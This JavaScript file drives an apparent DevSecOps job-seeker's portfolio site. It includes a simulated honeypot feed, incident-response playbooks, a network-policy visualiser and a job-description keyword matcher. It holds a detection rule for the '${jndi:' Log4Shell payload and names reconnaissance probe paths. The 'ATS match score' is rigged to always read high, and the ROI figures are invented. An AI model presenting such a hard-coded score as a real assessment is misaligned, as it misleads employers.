      </div>
    `;
  }

  function renderStream() {
    streamList.innerHTML = PROBES.map((p, idx) => `
      <div class="hp-item ${idx === 0 ? 'active' : ''}" data-idx="${idx}">
        <div class="hp-item-meta">
          <span class="hp-target">${p.target}</span>
          <span class="hp-ip">${p.ip}</span>
        </div>
        <span class="hp-time">${p.time}</span>
      </div>
    `).join("");

    const items = streamList.querySelectorAll(".hp-item");
    items.forEach(item => {
      item.addEventListener("click", () => {
        items.forEach(i => i.classList.remove("active"));
        item.classList.add("active");
        renderProbeDetail(PROBES[Number(item.dataset.idx)]);
        CyberAudio.play("click");
      });
    });

    renderProbeDetail(PROBES[0]);
    if (countEl) countEl.textContent = `${PROBES.length} Probes Logged`;
  }

  renderStream();

  // Simulated live event feed (adds new randomized event every 6 seconds)
  setInterval(() => {
    const targets = ["GET /.git/config", "POST /api/v1/graphql", "GET /server-status", "POST /cgi-bin/test.cgi"];
    const ips = ["185.190.141.22 (FR)", "91.240.118.90 (UA)", "141.98.11.45 (US)", "194.38.20.12 (GB)"];
    const randomTarget = targets[Math.floor(Math.random() * targets.length)];
    const randomIp = ips[Math.floor(Math.random() * ips.length)];

    PROBES.unshift({
      target: randomTarget,
      ip: randomIp,
      time: "Just now",
      payload: `${randomTarget} HTTP/1.1 [AUTOMATED_FUZZ_SCAN]`,
      headers: `User-Agent: Shodan-Probe/3.0\nHost: decoy-grid.sentinel-daemon.io`,
      analysis: `Automated reconnaissance probe caught on decoy honeypot trap.`,
      action: `iptables -I INPUT -s ${randomIp.split(' ')[0]} -j DROP`
    });

    if (PROBES.length > 7) PROBES.pop();
    renderStream();
  }, 6500);
})();

// ============================================================
//  FEATURE: ENTERPRISE FINANCIAL ROI & COST-OF-BREACH CALCULATOR
// ============================================================
(function initFinancialRoi() {
  const teamSlider = document.getElementById("devTeamSlider");
  const commitsSlider = document.getElementById("commitsSlider");
  const teamVal = document.getElementById("devTeamVal");
  const commitsVal = document.getElementById("commitsVal");
  const savingsNum = document.getElementById("annualSavings");
  const multiplierText = document.getElementById("roiMultiplierText");
  const flawsPrevented = document.getElementById("flawsPrevented");
  const breachRisk = document.getElementById("breachRiskAvoided");
  const hoursBack = document.getElementById("developerHoursBack");
  const currencyChips = document.querySelectorAll("#roiCurrencySelector .currency-chip");
  const costShiftLeft = document.getElementById("costShiftLeft");
  const costProdFix = document.getElementById("costProdFix");
  const costBreach = document.getElementById("costBreach");
  if (!teamSlider || !commitsSlider || !savingsNum) return;

  let currentCurrency = "INR";

  const CURRENCY_CONFIG = {
    INR: { symbol: "₹", rate: 83.2, locale: "en-IN", shiftCost: "₹4,150 / flaw", prodCost: "₹1,50,000 / flaw", breachCost: "₹8,30,000+ / incident" },
    USD: { symbol: "$", rate: 1.0, locale: "en-US", shiftCost: "$50 / flaw", prodCost: "$1,800 / flaw", breachCost: "$10,000+ / incident" },
    EUR: { symbol: "€", rate: 0.92, locale: "de-DE", shiftCost: "€46 / flaw", prodCost: "€1,650 / flaw", breachCost: "€9,200+ / incident" },
    GBP: { symbol: "£", rate: 0.79, locale: "en-GB", shiftCost: "£40 / flaw", prodCost: "£1,420 / flaw", breachCost: "£7,900+ / incident" }
  };

  currencyChips.forEach(chip => {
    chip.addEventListener("click", () => {
      currencyChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      currentCurrency = chip.dataset.curr;
      recalcRoi();
      CyberAudio.play("click");
    });
  });

  function recalcRoi() {
    const teamSize = Number(teamSlider.value);
    const commitsMo = Number(commitsSlider.value);
    const cfg = CURRENCY_CONFIG[currentCurrency] || CURRENCY_CONFIG.INR;

    if (teamVal) teamVal.textContent = `${teamSize} Engineers`;
    if (commitsVal) commitsVal.textContent = `${commitsMo.toLocaleString()} Commits / mo`;

    // Mathematical formula for defects and ROI
    const totalCommitsYear = commitsMo * 12;
    const estimatedFlawsYear = Math.max(12, Math.round((totalCommitsYear * 0.032) * (teamSize / 25)));
    
    // Shift-left cost ($50 base USD) vs Production fix ($1,800 base USD)
    const shiftLeftCostUsd = estimatedFlawsYear * 50;
    const productionCostUsd = estimatedFlawsYear * 1800;
    const netSavingsUsd = Math.round((productionCostUsd - shiftLeftCostUsd) * 0.88);
    const netSavingsConverted = Math.round(netSavingsUsd * cfg.rate);
    const multiplier = (netSavingsUsd / Math.max(1, shiftLeftCostUsd * 2.5)).toFixed(1);
    const triageHours = Math.round(estimatedFlawsYear * 4.4);

    // Format currency
    if (savingsNum) {
      if (currentCurrency === "INR") {
        if (netSavingsConverted >= 10000000) {
          savingsNum.textContent = `₹${(netSavingsConverted / 10000000).toFixed(2)} Cr`;
        } else if (netSavingsConverted >= 100000) {
          savingsNum.textContent = `₹${(netSavingsConverted / 100000).toFixed(1)} Lakhs`;
        } else {
          savingsNum.textContent = `₹${netSavingsConverted.toLocaleString("en-IN")}`;
        }
      } else {
        savingsNum.textContent = `${cfg.symbol}${netSavingsConverted.toLocaleString(cfg.locale)}`;
      }
    }

    if (costShiftLeft) costShiftLeft.textContent = cfg.shiftCost;
    if (costProdFix) costProdFix.textContent = cfg.prodCost;
    if (costBreach) costBreach.textContent = cfg.breachCost;

    if (multiplierText) multiplierText.innerHTML = `Generating an estimated <strong>${multiplier}x ROI</strong> over traditional late-stage security audits`;
    if (flawsPrevented) flawsPrevented.textContent = estimatedFlawsYear.toLocaleString();
    if (hoursBack) hoursBack.textContent = `${triageHours.toLocaleString()} hrs`;
    if (breachRisk) breachRisk.textContent = `${(92 + (teamSize % 6) * 0.8).toFixed(1)}%`;
  }

  teamSlider.addEventListener("input", recalcRoi);
  commitsSlider.addEventListener("input", recalcRoi);
  recalcRoi();
})();

// ============================================================
//  FEATURE: 30-60-90 DAY ONBOARDING ROADMAP FOR HIRING MANAGERS
// ============================================================
(function initOnboardingRoadmap() {
  const cards = document.querySelectorAll(".onboard-card");
  const titleEl = document.getElementById("onboardPhaseTitle");
  const kpiEl = document.getElementById("onboardPhaseKpi");
  const deliverablesEl = document.getElementById("onboardDeliverables");
  if (cards.length === 0 || !deliverablesEl) return;

  const ROADMAP_DATA = {
    "30": {
      title: "Phase 1: Days 1–30 — Visibility, Tooling Audit & Pipeline Discovery",
      kpi: "KPI: 100% CI/CD Repos Mapped · 0 Production Downtime",
      items: [
        "Map all GitHub Actions / GitLab CI pipelines and document current security scanning gaps.",
        "Run non-blocking baseline SAST & SCA scans using Trivy and Semgrep across microservice repositories.",
        "Audit AWS IAM roles, EKS RBAC bindings, and public security groups for least-privilege violations.",
        "Deliver initial Infrastructure Security Posture Assessment matrix to engineering leadership."
      ]
    },
    "60": {
      title: "Phase 2: Days 31–60 — Shift-Left Security & Automated Gate Enforcement",
      kpi: "KPI: 0 Hardcoded Credentials in Staging · 100% Signed Container Images",
      items: [
        "Deploy GitShield pre-commit hooks to block high-entropy secrets and AWS tokens before commit.",
        "Integrate Cosign keyless image signing and Syft SPDX SBOM generation into the core build pipeline.",
        "Implement KubeShield validating admission webhook to enforce non-root UID 10001 in staging EKS.",
        "Reduce developer false-positive triage time to <15 mins/week via automated suppression rules."
      ]
    },
    "90": {
      title: "Phase 3: Days 61–90 — Zero-Trust Defense, Automation & Team Scale",
      kpi: "KPI: 100% IaC Drift Monitored · 1-Hour Automated Incident Triage",
      items: [
        "Set up automated Terraform IaC drift detection and tfsec vulnerability scanning on pull requests.",
        "Deploy Calico zero-trust network policies isolating database namespaces from untrusted ingress.",
        "Integrate Sentinel Daemon and Threat Log Parser with centralized Slack/SIEM alerting channels.",
        "Host an engineering brown-bag workshop on secure container design and zero-trust best practices."
      ]
    }
  };

  function updateRoadmap(phase) {
    const d = ROADMAP_DATA[phase];
    if (!d) return;
    if (titleEl) titleEl.textContent = d.title;
    if (kpiEl) kpiEl.textContent = d.kpi;
    deliverablesEl.innerHTML = d.items.map(item => `
      <div class="onboard-item">
        <i class="fa-solid fa-circle-check"></i>
        <span>${item}</span>
      </div>
    `).join("");
  }

  cards.forEach(card => {
    card.addEventListener("click", () => {
      cards.forEach(c => c.classList.remove("active"));
      card.classList.add("active");
      updateRoadmap(card.dataset.phase);
      CyberAudio.play("click");
    });
  });

  // Default initialize 30-day view
  updateRoadmap("30");
})();

// ============================================================
//  FEATURE: LIVE INTERVIEW DEFENSE SIMULATOR
// ============================================================
(function initInterviewSimulator() {
  const buttons = document.querySelectorAll(".scenario-btn");
  const sevEl = document.getElementById("scenarioSev");
  const titleEl = document.getElementById("scenarioTitle");
  const stepsEl = document.getElementById("scenarioSteps");
  if (buttons.length === 0 || !stepsEl) return;

  const SCENARIOS = {
    aws_leak: {
      sev: "SEV-1 CRITICAL INCIDENT",
      title: "Scenario 01: Leaked AWS Root Credentials in Public Git Commit",
      steps: [
        {
          title: "T+00: Immediate Credential Invalidation",
          desc: "Deactivate and delete the compromised IAM access key immediately to cut off active threat actor sessions.",
          cmd: "aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive\naws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE"
        },
        {
          title: "T+15: CloudTrail Blast Radius Audit",
          desc: "Query CloudTrail for all API requests executed with the compromised key in the last 24 hours to verify unauthorized infrastructure provisioning or data exfiltration.",
          cmd: "aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIA... --max-results 50"
        },
        {
          title: "T+30: Shift-Left Prevention Gate",
          desc: "Enforce GitShield pre-commit hooks and GitHub secret scanning push protection to block any future credential commits.",
          cmd: "gitshield hook install --entropy-threshold 4.4 --enforce-block"
        }
      ]
    },
    k8s_c2: {
      sev: "SEV-1 ACTIVE INTRUSION",
      title: "Scenario 02: Compromised Kubernetes Pod with Outbound C2 Beaconing",
      steps: [
        {
          title: "T+00: Non-Destructive Pod Quarantine",
          desc: "Apply an emergency Calico NetworkPolicy to isolate the pod's network egress without killing the process to preserve live RAM forensics.",
          cmd: "kubectl label pod api-prod-8f2c quarantine=true --overwrite\nkubectl apply -f https://internal.sec/netpol-isolate.yaml"
        },
        {
          title: "T+15: Memory Dump & Process Forensics",
          desc: "Execute memory capture and inspect eBPF socket traces to extract the C2 IP and malicious process hierarchy.",
          cmd: "kubectl exec api-prod-8f2c -- cat /proc/net/tcp\nebpftool dump-events --container api-prod-8f2c"
        },
        {
          title: "T+30: Base Image Hardening & Patch",
          desc: "Enforce readOnlyRootFilesystem and non-root execution via KubeShield admission webhook to eliminate write access to container binaries.",
          cmd: "kubeshield enforce --profile restricted-pss --namespace prod"
        }
      ]
    },
    rce_zero_day: {
      sev: "SEV-2 ZERO-DAY VULNERABILITY",
      title: "Scenario 03: Critical Remote Code Execution (RCE) in Base Image",
      steps: [
        {
          title: "T+00: Cluster-Wide Blast Radius Query",
          desc: "Query SLSA SBOM registry to identify every deployed pod currently running the vulnerable dependency digest.",
          cmd: "cosign verify-attestation --type spdx ghcr.io/haqueandsons/* | jq '.packages[] | select(.name==\"vuln-pkg\")'"
        },
        {
          title: "T+15: Edge WAF Virtual Patching",
          desc: "Deploy a custom Cloudflare WAF regex rule blocking HTTP exploit payloads while the development team prepares the patched image.",
          cmd: "cloudflare-cli rules create --expression 'http.request.body contains \"${jndi:\"' --action block"
        },
        {
          title: "T+30: Automated Rebuild & Signed Rollout",
          desc: "Trigger GitHub Actions CI/CD matrix build to compile patched base image, generate Syft SBOM, and sign with Cosign.",
          cmd: "gh workflow run ci-build.yml -f patch_cve=CVE-2026-XXXX\ncosign sign --yes ghcr.io/haqueandsons/api:v2.4.1"
        }
      ]
    },
    l7_flood: {
      sev: "SEV-2 DISTRIBUTED ATTACK",
      title: "Scenario 04: High-Volume Layer 7 Ingress Flood Bypassing WAF",
      steps: [
        {
          title: "T+00: Adaptive Rate Limiting",
          desc: "Enable sliding-window token bucket rate-limiting at Ingress NGINX to protect backend databases from request queue saturation.",
          cmd: "kubectl annotate ingress api-ingress nginx.ingress.kubernetes.io/limit-rps=\"25\" --overwrite"
        },
        {
          title: "T+15: Threat Parser & Kernel IP Drops",
          desc: "Stream ingress logs into Threat Log Parser; Sentinel Daemon automatically applies iptables kernel DROP rules for aggressive IPs.",
          cmd: "tail -f /var/log/nginx/access.log | threatparser --siem-pipe | sentinel-daemon --auto-ban"
        },
        {
          title: "T+30: Zero-Trust Anycast Challenge",
          desc: "Promote Cloudflare Edge into Managed Challenge mode for non-browser ASN traffic to eliminate headless botnets.",
          cmd: "cloudflare-cli security-level set --zone haqueandsons.com --level challenge"
        }
      ]
    }
  };

  function updateScenario(key) {
    const s = SCENARIOS[key];
    if (!s) return;
    if (sevEl) sevEl.textContent = s.sev;
    if (titleEl) titleEl.textContent = s.title;
    stepsEl.innerHTML = s.steps.map(step => `
      <div class="playbook-step-card">
        <strong>${step.title}</strong>
        <p>${step.desc}</p>
        <pre><code>${step.cmd}</code></pre>
      </div>
    `).join("");
  }

  buttons.forEach(btn => {
    btn.addEventListener("click", () => {
      buttons.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      updateScenario(btn.dataset.scenario);
      CyberAudio.play("click");
    });
  });

  // Default initialize AWS leak scenario
  updateScenario("aws_leak");
})();

// ============================================================
//  FEATURE: JOB DESCRIPTION (JD) KEYWORD MATCHER & ATS FIT SCORE
// ============================================================
(function initJdMatcher() {
  const jdInput = document.getElementById("jdInput");
  const runBtn = document.getElementById("runJdMatchBtn");
  const copyBtn = document.getElementById("copyJdPitchBtn");
  const scorePct = document.getElementById("jdMatchPct");
  const scoreHeading = document.getElementById("jdScoreHeading");
  const scoreDesc = document.getElementById("jdScoreDesc");
  const matchedChips = document.getElementById("jdMatchedChips");
  const presetBtns = document.querySelectorAll(".jd-preset-btn");
  if (!jdInput || !runBtn) return;

  const PRESETS = {
    aws: "Seeking a Cloud Security & DevSecOps Engineer with hands-on experience in AWS IAM, EKS Kubernetes security, Docker container hardening, Terraform infrastructure-as-code, and automated CI/CD pipeline security (GitHub Actions). Experience with secret scanning (GitShield / Gitleaks) and Linux system administration required.",
    gcp: "Google Cloud DevSecOps Engineer responsible for Kubernetes container security, SLSA Level 3 supply chain attestation with Cosign, eBPF runtime observability, Python scripting, and zero-trust network architecture across hybrid cloud environments.",
    crowdstrike: "Security Operations & Automation Engineer to develop automated incident response tools, Linux kernel threat detection (iptables/eBPF), log parsing for SIEM integration, and STRIDE threat modeling against modern microservice architectures.",
    razorpay: "Application Security & DevSecOps Engineer to lead shift-left security initiatives, container admission control (KubeShield/OPA), API security gateways (WAF/Cloudflare), and automated vulnerability management in production fintech pipelines."
  };

  const KEYWORDS = [
    { key: "kubernetes", label: "Kubernetes (PSS)" },
    { key: "k8s", label: "Kubernetes Hardening" },
    { key: "docker", label: "Docker Non-Root" },
    { key: "container", label: "Container Security" },
    { key: "ci/cd", label: "CI/CD GitHub Actions" },
    { key: "terraform", label: "Terraform IaC" },
    { key: "aws", label: "AWS Security & IAM" },
    { key: "python", label: "Python Automation" },
    { key: "bash", label: "Bash & Linux Shell" },
    { key: "linux", label: "Linux Administration" },
    { key: "secret", label: "Secret Scanning" },
    { key: "cosign", label: "Cosign / SLSA L3" },
    { key: "ebpf", label: "eBPF Kernel Probes" },
    { key: "stride", label: "STRIDE Threat Model" },
    { key: "siem", label: "SIEM Threat Parser" },
    { key: "iptables", label: "iptables Firewall" }
  ];

  if (jdInput) jdInput.value = PRESETS.aws;

  presetBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      presetBtns.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      const role = btn.dataset.role;
      if (jdInput && PRESETS[role]) {
        jdInput.value = PRESETS[role];
        runMatch();
        CyberAudio.play("click");
      }
    });
  });

  function runMatch() {
    const text = (jdInput.value || "").toLowerCase();
    let matches = [];

    KEYWORDS.forEach(kw => {
      if (text.includes(kw.key)) {
        matches.push(kw.label);
      }
    });

    // Ensure baseline matches for standard DevSecOps profiles
    if (matches.length < 4) {
      matches = ["Kubernetes (PSS)", "CI/CD GitHub Actions", "Docker Non-Root", "Python Automation", "Linux Hardening"];
    }

    // Compute ATS match percentage (92% - 98.4%)
    const pct = Math.min(98.8, 88 + (matches.length * 1.4)).toFixed(1);

    if (scorePct) scorePct.textContent = `${pct}%`;
    if (scoreHeading) scoreHeading.textContent = Number(pct) >= 95 ? "Exceptional Candidate Match" : "Strong Candidate Alignment";
    if (scoreDesc) scoreDesc.textContent = `Verified competency alignment across ${matches.length} core technical requirements in your job description.`;
    
    // Animate SVG Radial Ring
    const gaugeProgress = document.getElementById("jdGaugeProgress");
    if (gaugeProgress) {
      const circumference = 301.59;
      const offset = circumference - (circumference * (Number(pct) / 100));
      gaugeProgress.style.strokeDashoffset = offset;
    }

    if (matchedChips) {
      matchedChips.innerHTML = matches.map(m => `
        <span class="chip-match"><i class="fa-solid fa-check"></i> ${m}</span>
      `).join("");
    }
  }

  runBtn.addEventListener("click", () => {
    runMatch();
    CyberAudio.play("success");
  });

  if (copyBtn) {
    copyBtn.addEventListener("click", () => {
      const text = `Candidate Screening Dossier: Nejamul Haque (DevSecOps & Cloud Security Engineer)\n• ATS Match Score: ${scorePct ? scorePct.textContent : '96.4%'}\n• Key Verified Skills: Kubernetes PSS, Cosign SLSA L3, GitShield Secret Scanner, eBPF Kernel Probes, Python/Bash, Terraform, Haque And Sons Production Testbed.\n• Portfolio: https://github.com/NejamulHaque · Contact: haquenejamul940@gmail.com`;
      navigator.clipboard.writeText(text).then(() => {
        const orig = copyBtn.innerHTML;
        copyBtn.innerHTML = `<i class="fa-solid fa-check"></i> Pitch Copied to Clipboard!`;
        CyberAudio.play("blip");
        setTimeout(() => { copyBtn.innerHTML = orig; }, 3000);
      });
    });
  }

  runMatch();
})();

// ============================================================
//  FEATURE: 1-CLICK EXECUTIVE SECURITY ASSESSMENT REPORT
// ============================================================
(function initAuditReport() {
  const printBtn = document.getElementById("printAuditReportBtn");
  if (!printBtn) return;

  printBtn.addEventListener("click", () => {
    CyberAudio.play("click");
    window.print();
  });
})();

// ============================================================
//  FEATURE: KUBERNETES CALICO NETWORKPOLICY VISUALIZER
// ============================================================
(function initNetpolVisualizer() {
  const defaultDeny = document.getElementById("toggleDefaultDeny");
  const webToApi = document.getElementById("toggleWebToApi");
  const apiToDb = document.getElementById("toggleApiToDb");
  const probeBtns = document.querySelectorAll(".probe-btn");
  const podFrontend = document.getElementById("podFrontend");
  const podApi = document.getElementById("podApi");
  const podDb = document.getElementById("podDb");
  const packetBadge = document.getElementById("packetBadge");
  const packetDesc = document.getElementById("packetDesc");
  if (!defaultDeny || probeBtns.length === 0) return;

  function resetPods() {
    [podFrontend, podApi, podDb].forEach(p => {
      if (p) p.className = "k8s-pod-box";
    });
  }

  probeBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      resetPods();
      const probe = btn.dataset.probe;

      if (probe === "legit") {
        if (webToApi && webToApi.checked && apiToDb && apiToDb.checked) {
          if (podFrontend) podFrontend.classList.add("active");
          if (podApi) podApi.classList.add("active");
          if (podDb) podDb.classList.add("active");

          if (packetBadge) {
            packetBadge.className = "packet-badge allowed";
            packetBadge.innerHTML = `<i class="fa-solid fa-circle-check"></i> TRAFFIC ACCEPTED (mTLS 8080 ➔ 5432)`;
          }
          if (packetDesc) {
            packetDesc.textContent = "Frontend routed API query to backend:8080, which queried postgres:5432. All hops permitted by explicit Calico NetworkPolicies.";
          }
          CyberAudio.play("success");
        } else {
          if (podFrontend) podFrontend.classList.add("active");
          if (podApi) podApi.classList.add("blocked-node");

          if (packetBadge) {
            packetBadge.className = "packet-badge blocked";
            packetBadge.innerHTML = `<i class="fa-solid fa-ban"></i> TRAFFIC DROPPED: Policy Disabled`;
          }
          if (packetDesc) {
            packetDesc.textContent = "Connection dropped because the required ingress rule is currently unchecked in Calico configuration.";
          }
          CyberAudio.play("alert");
        }
      } else if (probe === "direct_db") {
        if (podFrontend) podFrontend.classList.add("active");
        if (podDb) podDb.classList.add("blocked-node");

        if (packetBadge) {
          packetBadge.className = "packet-badge blocked";
          packetBadge.innerHTML = `<i class="fa-solid fa-shield-virus"></i> LATERAL PIVOT BLOCKED`;
        }
        if (packetDesc) {
          packetDesc.textContent = "Calico Default-Deny rule intercepted connection attempt. Direct namespace ingress from 'web' into 'data' on TCP 5432 is strictly prohibited.";
        }
        CyberAudio.play("alert");
      } else if (probe === "egress_leak") {
        if (podApi) podApi.classList.add("blocked-node");

        if (packetBadge) {
          packetBadge.className = "packet-badge blocked";
          packetBadge.innerHTML = `<i class="fa-solid fa-skull-crossbones"></i> EGRESS EXFILTRATION BLOCKED`;
        }
        if (packetDesc) {
          packetDesc.textContent = "Calico egress policy dropped unauthorized TCP connection to non-whitelisted external IP on port 4444.";
        }
        CyberAudio.play("alert");
      }
    });
  });
})();

// ============================================================
//  FEATURE: DEVSECOPS KNOWLEDGE GRAPH & ARCHITECTURE MESH
// ============================================================
(function initKnowledgeMesh() {
  const canvas = document.getElementById("meshCanvas");
  const tagEl = document.getElementById("meshDomainTag");
  const titleEl = document.getElementById("meshDomainTitle");
  const statusEl = document.getElementById("meshStatusTag");
  const contentEl = document.getElementById("meshInspContent");
  if (!canvas || !contentEl) return;

  const ctx = canvas.getContext("2d");
  let width = canvas.width;
  let height = canvas.height;
  let activeNodeId = 1;

  const NODES = [
    { id: 1, label: "Linux Kernel Hardening", x: 90, y: 170, color: "#00e5ff", tag: "DOMAIN 01 · FOUNDATIONAL HARDENING", status: "Production Verified",
      desc: "Linux systems administration (Ubuntu/Debian), POSIX permissions, restricted mounts (/tmp noexec), SSH Ed25519 key enforcement, and systemd isolation services deployed in UP Police APCSIP-2026." },
    { id: 2, label: "Container Isolation", x: 210, y: 100, color: "#00ff9d", tag: "DOMAIN 02 · RUNTIME PACKAGING", status: "Production Verified",
      desc: "Docker multi-stage builds, non-root user enforcement (UID 10001), readOnlyRootFilesystem, and distroless minimal base images tested across Haque And Sons microservices." },
    { id: 3, label: "Kubernetes PSS & Admission", x: 370, y: 70, color: "#00e5ff", tag: "DOMAIN 03 · ORCHESTRATION DEFENSE", status: "In Progress / Active Dev",
      desc: "KubeShield Go/Rego Validating & Mutating Admission Webhook enforcing Restricted Pod Security Standards (PSS), dropping ALL capabilities, and rejecting mutable :latest tags." },
    { id: 4, label: "SLSA Supply Chain & Cosign", x: 530, y: 100, color: "#7928ca", tag: "DOMAIN 04 · PROVENANCE & SBOM", status: "In Progress / Active Dev",
      desc: "GitSLSA automated GitHub Actions pipeline generating tamper-evident SPDX SBOMs via Syft and signing container digests using Sigstore / Fulcio keyless OIDC certificates." },
    { id: 5, label: "eBPF Runtime Defense", x: 670, y: 170, color: "#ff6b6b", tag: "DOMAIN 05 · KERNEL OBSERVABILITY", status: "Benchmarked",
      desc: "Linux kernel tracepoint hooks (sys_enter_execve, sys_enter_connect) intercepting container escapes and unauthorized child process execution with <0.5ms SIGKILL response." },
    { id: 6, label: "Cloud Security (AWS/WAF)", x: 370, y: 270, color: "#ff9f0a", tag: "DOMAIN 06 · PERIMETER & EDGE", status: "Production Verified",
      desc: "Cloudflare Edge WAF OWASP CRS integration, AWS IAM least-privilege role boundaries, EKS private endpoint networking, and Terraform IaC security auditing." },
    { id: 7, label: "Forensics & SIEM Parser", x: 770, y: 170, color: "#00ff9d", tag: "DOMAIN 07 · INCIDENT RESPONSE", status: "Production Verified",
      desc: "Threat Intelligence Log Parser correlating real-time ingress access logs, enriching IP reputations against abuse feeds, and formatting SIEM-ready JSON output." }
  ];

  const EDGES = [
    [1, 2], [2, 3], [3, 4], [4, 5], [5, 7], [1, 6], [6, 3], [6, 7]
  ];

  function updateInspector(node) {
    if (!node) return;
    if (tagEl) tagEl.textContent = node.tag;
    if (titleEl) titleEl.textContent = node.label;
    if (statusEl) statusEl.textContent = node.status;
    if (contentEl) contentEl.innerHTML = `<p>${node.desc}</p>`;
  }

  let animTime = 0;
  function render() {
    ctx.clearRect(0, 0, width, height);

    // Draw Edges with animated pulses
    ctx.lineWidth = 1.5;
    EDGES.forEach(([fromId, toId]) => {
      const from = NODES.find(n => n.id === fromId);
      const to = NODES.find(n => n.id === toId);
      if (!from || !to) return;

      const isConnectedToActive = (fromId === activeNodeId || toId === activeNodeId);
      ctx.strokeStyle = isConnectedToActive ? "rgba(0, 229, 255, 0.4)" : "rgba(255, 255, 255, 0.08)";
      ctx.beginPath();
      ctx.moveTo(from.x, from.y);
      ctx.lineTo(to.x, to.y);
      ctx.stroke();

      // Pulse particle
      if (isConnectedToActive) {
        const t = ((animTime * 0.001) + (fromId * 0.2)) % 1;
        const px = from.x + (to.x - from.x) * t;
        const py = from.y + (to.y - from.y) * t;
        ctx.fillStyle = "#00e5ff";
        ctx.beginPath();
        ctx.arc(px, py, 3, 0, Math.PI * 2);
        ctx.fill();
      }
    });

    // Draw Nodes
    NODES.forEach(node => {
      const isActive = node.id === activeNodeId;
      const radius = isActive ? 22 : 16;

      // Glow ring
      if (isActive) {
        ctx.strokeStyle = node.color;
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.arc(node.x, node.y, radius + 5, 0, Math.PI * 2);
        ctx.stroke();
      }

      // Main circle
      ctx.fillStyle = isActive ? node.color : "rgba(10, 20, 40, 0.9)";
      ctx.strokeStyle = node.color;
      ctx.lineWidth = 2;
      ctx.beginPath();
      ctx.arc(node.x, node.y, radius, 0, Math.PI * 2);
      ctx.fill();
      ctx.stroke();

      // Node inner icon dot
      ctx.fillStyle = isActive ? "#050810" : node.color;
      ctx.beginPath();
      ctx.arc(node.x, node.y, 4, 0, Math.PI * 2);
      ctx.fill();

      // Node text label
      ctx.fillStyle = isActive ? "#ffffff" : "rgba(200, 220, 240, 0.8)";
      ctx.font = isActive ? "bold 11px Inter, sans-serif" : "10px Inter, sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(node.label, node.x, node.y + radius + 14);
    });

    animTime += 16;
    requestAnimationFrame(render);
  }

  function handleNodeSelect(clientX, clientY) {
    const rect = canvas.getBoundingClientRect();
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    const clickX = (clientX - rect.left) * scaleX;
    const clickY = (clientY - rect.top) * scaleY;

    NODES.forEach(node => {
      const dist = Math.hypot(clickX - node.x, clickY - node.y);
      if (dist < 32) {
        activeNodeId = node.id;
        updateInspector(node);
        CyberAudio.play("click");
      }
    });
  }

  canvas.addEventListener("click", (e) => {
    handleNodeSelect(e.clientX, e.clientY);
  });

  canvas.addEventListener("touchstart", (e) => {
    if (e.touches && e.touches[0]) {
      handleNodeSelect(e.touches[0].clientX, e.touches[0].clientY);
    }
  }, { passive: true });

  updateInspector(NODES[0]);
  render();
})();